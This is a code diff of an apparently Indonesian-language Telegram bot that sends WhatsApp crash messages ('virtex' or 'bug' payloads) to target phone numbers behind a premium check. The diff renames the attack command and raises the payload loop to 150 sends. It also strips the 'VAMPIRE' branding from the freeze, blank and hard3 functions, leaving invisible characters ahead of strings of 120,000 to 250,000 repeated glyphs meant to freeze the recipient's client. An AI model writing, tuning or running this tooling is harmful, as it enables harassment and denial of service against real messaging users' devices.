@@ -1622,7 +1622,7 @@ bot.command("cd", async (ctx) => {
 });
 
 //
-bot.command("cursed", checkPremium, async (ctx) => {
+bot.command("ranz", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1683,14 +1683,8 @@ bot.command("cursed", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 5; i++) {
-          await Bug2(sock, target);
-          await nebula(sock, target);
-          await noclick(sock, target);
+        for (let i = 0; i < 150; i++) {
           await InvisiPayload(sock, target);
-          await Payload(sock, target);
-          await noclick(sock, target);
-          await nebula(sock, target);
         }
         successCount++;
       } catch (error) {
@@ -3030,7 +3024,7 @@ async function blank(sock, target) {
               hasMediaAttachment: true,
             },
             body: {
-              text: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!" + ui + jids,
+              text: "ㅤ ㅤ" + ui + jids,
             },
             footer: {
               text: "",
@@ -3089,7 +3083,7 @@ async function blank(sock, target) {
 }
 
 async function freeze(sock, target) {
-  let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙵𝚁𝙴𝙴𝚉𝙴" + "ꦾ".repeat(250000) + "@8".repeat(250000);
+  let virtex = "ㅤㅤㅤㅤ" + "ꦾ".repeat(250000) + "@8".repeat(250000);
   await sock.relayMessage(
     target,
     {
@@ -3140,7 +3134,7 @@ async function hard3(sock, target) {
         message: {
           newsletterAdminInviteMessage: {
             newsletterJid: `33333333333333333@newsletter`,
-            newsletterName: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐁𝐋𝐀𝐍𝐊" + "ꦾ".repeat(120000),
+            newsletterName: "ㅤㅤㅤㅤ" + "ꦾ".repeat(120000),
             jpegThumbnail: "",
             caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
             inviteExpiration: Date.now() + 1814400000, // 21 hari
